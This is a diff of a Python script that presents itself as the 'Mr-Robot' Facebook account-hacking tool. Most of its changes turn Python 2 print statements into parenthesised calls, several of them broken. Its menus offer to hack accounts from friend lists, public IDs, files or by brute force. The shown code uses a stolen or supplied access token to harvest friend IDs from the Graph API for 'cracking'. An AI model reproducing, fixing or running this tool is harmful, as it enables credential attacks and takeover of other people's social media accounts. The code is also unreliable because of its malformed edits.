@@ -58,7 +58,7 @@ def tik():
     titik = [
      '.   ', '..  ', '... ']
     for o in titik:
-        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
+        print ('\r\x1b[1;93mPlease Wait \x1b[1;93m') + o,
         sys.stdout.flush()
         time.sleep(1)
 
@@ -72,7 +72,7 @@ listgrup = []
 vulnot = '\x1b[31mNot Vuln'
 vuln = '\x1b[32mVuln'
 os.system('clear')
-print '\n\n\x1b[1;96m ------------------------\n \x1b[1;32m < 1_l0V3_H4CK1NG >\n \x1b[1;96m ------------------------\n\x1b[1;32m _    _       __  __\n=====================================================\n                    ASSALAMU ALAIKUM                    \n            Coded By : Sayyed Zakarya       \n                 Facebook Page : Aryano Tricks                \n            Youtube : Aryano Tricks     \n                Facebook : Sayyed Zakarya Bacha            \n     ---------------    ---------------    ------------  \n                    Mr-Robot Programmering                     \n  =====================================================\n\x1b[1;97m------------------------------------+-----------------'
+print ('\n\n\x1b[1;96m ------------------------\n \x1b[1;32m < 1_l0V3_H4CK1NG >\n \x1b[1;96m ------------------------\n\x1b[1;32m _    _       __  __\n=====================================================\n                    ASSALAMU ALAIKUM                    \n            Coded By : Sayyed Zakarya       \n                 Facebook Page : Aryano Tricks                \n            Youtube : Aryano Tricks     \n                Facebook : Sayyed Zakarya Bacha            \n     ---------------    ---------------    ------------  \n                    Mr-Robot Programmering                     \n  =====================================================\n\x1b[1;97m------------------------------------+-----------------')
 jalan('\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;99mMr-Robot\x1b[1;99m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2')
 jalan('\x1b[1;97m  _______         _            \\ CLONE ALL COUNTRY') 
 jalan('\x1b[1;96m (_____  )       ( )                               ')
@@ -98,10 +98,10 @@ while loop == 'true':
             time.sleep(2)
             loop = 'false'
         else:
-            print '\x1b[1;96mWrong Password'
+            print ('\x1b[1;96mWrong Password')
             os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg')
     else:
-        print '\x1b[1;96mWrong Username'
+        print ('\x1b[1;96mWrong Username')
         os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg')
 
 idh = []
@@ -174,26 +174,26 @@ def menu():
     print logo
     print logo1
     print 
-    print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;32;40m[*] Name\x1b[1;32;40m: ' + nama + '  \t   \x1b[1;36;40m\xe2\x95\x91'
-    print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;33;40m[*] ID  \x1b[1;34;40m: ' + id + '        \x1b[1;36;40m\xe2\x95\x91'
-    print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;36;40m[*] Subs\x1b[1;34;40m: ' + sub + '                      \x1b[1;36;40m\xe2\x95\x91'
-    print '\x1b[1;32;40m[1] \x1b[1;33;41mHack Facebook Accounts'
-    print '\x1b[1;32;40m[2] \x1b[1;33;42mUpdate Mr-Robot Tool'
-    print '\x1b[1;32;40m[0] \x1b[1;33;43mLog out'
+    print ('   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;32;40m[*] Name\x1b[1;32;40m: ' + nama + '  \t   \x1b[1;36;40m\xe2\x95\x91')
+    print ('   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;33;40m[*] ID  \x1b[1;34;40m: ' + id + '        \x1b[1;36;40m\xe2\x95\x91')
+    print ('   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;36;40m[*] Subs\x1b[1;34;40m: ' + sub + '                      \x1b[1;36;40m\xe2\x95\x91')
+    print ('\x1b[1;32;40m[1] \x1b[1;33;41mHack Facebook Accounts')
+    print ('\x1b[1;32;40m[2] \x1b[1;33;42mUpdate Mr-Robot Tool')
+    print ('\x1b[1;32;40m[0] \x1b[1;33;43mLog out')
     pilih()
 
 
 def pilih():
     unikers = raw_input('\n\x1b[1;31;40m>>> \x1b[1;35;40m')
     if unikers == '':
-        print '\x1b[1;91mFill in correctly'
+        print ('\x1b[1;91mFill in correctly')
         pilih()
     elif unikers == '1':
         super()
     elif unikers == '2':
         os.system('clear')
         print logo
-        print ' \x1b[1;36;40m\xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f\n'
+        print (' \x1b[1;36;40m\xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f\n'))
         os.system('git pull origin master')
         raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
         menu()
@@ -202,7 +202,7 @@ def pilih():
         os.system('rm -rf login.txt')
         keluar()
     else:
-        print '\x1b[1;91mFill in correctly'
+        print ('\x1b[1;91mFill in correctly')
         pilih()
 
 
@@ -212,18 +212,19 @@ def super():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91mToken invalid'
+        print ('\x1b[1;91mToken invalid')
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
 
     os.system('clear')
     print logo
-    print '\x1b[1;32;40m[type1] \x1b[1;33;41mHack From Friend List'
-    print '\x1b[1;32;40m[type2] \x1b[1;33;42mHack From Public ID'
-    print '\x1b[1;32;40m[type3] \x1b[1;33;43mHack Bruteforce'
-    print '\x1b[1;32;40m[type4] \x1b[1;33;44mHack From File'
-    print '\x1b[1;32;40m[type0] \x1b[1;33;45mBack'
+    print logo1
+    print ('\x1b[1;32;40m[type1] \x1b[1;33;41mHack From Friend List')
+    print ('\x1b[1;32;40m[type2] \x1b[1;33;42mHack From Public ID')
+    print ('\x1b[1;32;40m[type3] \x1b[1;33;43mHack Bruteforce')
+    print ('\x1b[1;32;40m[type4] \x1b[1;33;44mHack From File')
+    print ('\x1b[1;32;40m[type0] \x1b[1;33;45mBack')
     pilih_super()
 
 
@@ -232,12 +233,13 @@ def pilih_super():
     global oks
     peak = raw_input('\n\x1b[1;31;40m>>> \x1b[1;97m')
     if peak == '':
-        print '\x1b[1;91mFill in correctly'
+        print ('\x1b[1;91mFill in correctly')
         pilih_super()
     else:
         if peak == '1':
             os.system('clear')
             print logo
+            print logo1
             jalan('\x1b[1;93m[\xe2\x9c\xba] Getting IDs \x1b[1;97m...')
             r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
             z = json.loads(r.text)
@@ -247,17 +249,18 @@ def pilih_super():
         elif peak == '2':
             os.system('clear')
             print logo
+            print logo1
             idt = raw_input('\x1b[1;96m[*] Enter ID : ')
             try:
                 jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                 op = json.loads(jok.text)
-                print '\x1b[1;31;40m[\xe2\x9c\xba] Name : ' + op['name']
+                print ('\x1b[1;31;40m[\xe2\x9c\xba] Name : ') + op['name']
             except KeyError:
-                print '\x1b[1;92m[\xe2\x9c\xba] ID Not Found!'
+                print ('\x1b[1;92m[\xe2\x9c\xba] ID Not Found!')
                 raw_input('\n\x1b[1;96m[\x1b[1;94mBack\x1b[1;96m]')
                 super()
 
-            print '\x1b[1;35;40m[\xe2\x9c\xba] Getting IDs...'
+            print ('\x1b[1;35;40m[\xe2\x9c\xba] Getting IDs...')
             r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
             z = json.loads(r.text)
             for i in z['data']:
@@ -266,6 +269,7 @@ def pilih_super():
         elif peak == '3':
             os.system('clear')
             print logo
+            print logo1
             brute()
         elif peak == '4':
             os.system('clear')
@@ -285,16 +289,16 @@ def pilih_super():
         else:
             print '\x1b[1;96m[!] \x1b[1;91mFill in correctly'
             pilih_super()
-        print '\x1b[1;96m[+] \x1b[1;93mTotal IDs \x1b[1;91m: \x1b[1;97m' + str(len(id))
+        print ('\x1b[1;96m[+] \x1b[1;93mTotal IDs \x1b[1;91m: \x1b[1;97m' + str(len(id))
         jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStarting \x1b[1;97m...')
         titik = ['.   ', '..  ', '... ']
         for o in titik:
-            print '\r\x1b[1;96m[\x1b[1;97m\xe2\x9c\xb8\x1b[1;96m] \x1b[1;93mCracking \x1b[1;97m' + o,
+            print ('\r\x1b[1;96m[\x1b[1;97m\xe2\x9c\xb8\x1b[1;96m] \x1b[1;93mCracking \x1b[1;97m' + o,
             sys.stdout.flush()
             time.sleep(1)
 
     print
-    print '\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z'
+    print ('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
     print 42 * '\x1b[1;96m='
 
     def main(arg):
